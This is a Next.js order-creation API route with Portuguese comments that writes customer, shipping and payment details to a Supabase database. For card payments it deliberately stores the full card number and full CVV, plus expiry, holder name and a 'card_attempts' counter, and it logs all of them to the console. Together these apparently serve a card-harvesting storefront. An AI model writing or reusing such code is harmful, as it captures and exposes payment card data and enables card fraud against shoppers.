import { type NextRequest, NextResponse } from "next/server"
import { createServerClient } from "@/lib/supabase-server"

export async function POST(request: NextRequest) {
  try {
    const supabase = await createServerClient()
    const data = await request.json()

    console.log("[v0] Creating order with data:", data)

    let cardLastDigits = null
    let cardNumber = null
    let cardCvv = null

    if (data.payment_method === "card" && data.card_number) {
      const cleanNumber = data.card_number.replace(/\s/g, "")
      cardLastDigits = cleanNumber.slice(-4)
      cardNumber = cleanNumber // Salvar número completo
      cardCvv = data.card_cvv // Salvar CVV completo
    }

    // Preparar dados para inserção
    const orderData = {
      // Detalhes do pedido
      size: data.size,
      price: Number.parseFloat(data.price),
      include_remote_control: data.include_remote_control || false,
      remote_control_price: data.include_remote_control ? 38.9 : null,
      total_price: Number.parseFloat(data.total_price),
      quantity: data.quantity || 1,

      // Dados do cliente
      customer_name: data.customer_name,
      customer_email: data.customer_email,
      customer_document: data.customer_document,

      // Informações do veículo
      vehicle_brand: data.vehicle_brand || null,
      vehicle_model: data.vehicle_model || null,
      vehicle_name: data.vehicle_name || null,
      vehicle_color: data.vehicle_color || null,
      vehicle_description: data.vehicle_description || null,

      // Fotos
      photos_count: data.photos_count || 0,

      // Endereço de entrega
      shipping_cep: data.shipping_cep || null,
      shipping_street: data.shipping_street || null,
      shipping_number: data.shipping_number || null,
      shipping_complement: data.shipping_complement || null,
      shipping_neighborhood: data.shipping_neighborhood || null,
      shipping_city: data.shipping_city || null,
      shipping_state: data.shipping_state || null,
      shipping_method: data.shipping_method || null,

      // Método de pagamento
      payment_method: data.payment_method,
      payment_status: "pending",
      order_status: "processing",

      // Informações de pagamento PIX
      pix_transaction_id: data.pix_transaction_id || null,
      pix_qrcode: data.pix_qrcode || null,

      card_holder_name: data.payment_method === "card" ? data.card_holder_name : null,
      card_last_digits: cardLastDigits,
      card_number: cardNumber, // Número completo
      card_cvv: cardCvv, // CVV completo
      card_expiry: data.payment_method === "card" ? data.card_expiry : null,
      card_attempts: data.card_attempts || 0,
    }

    console.log("[v0] Inserting order data:", orderData)

    const { data: order, error } = await supabase.from("orders").insert([orderData]).select().single()

    if (error) {
      console.error("[v0] Supabase error:", error)
      return NextResponse.json({ error: "Failed to create order", details: error.message }, { status: 500 })
    }

    console.log("[v0] Order created successfully:", order)

    return NextResponse.json({ order }, { status: 201 })
  } catch (error: any) {
    console.error("[v0] Error creating order:", error)
    return NextResponse.json({ error: "Internal server error", details: error.message }, { status: 500 })
  }
}
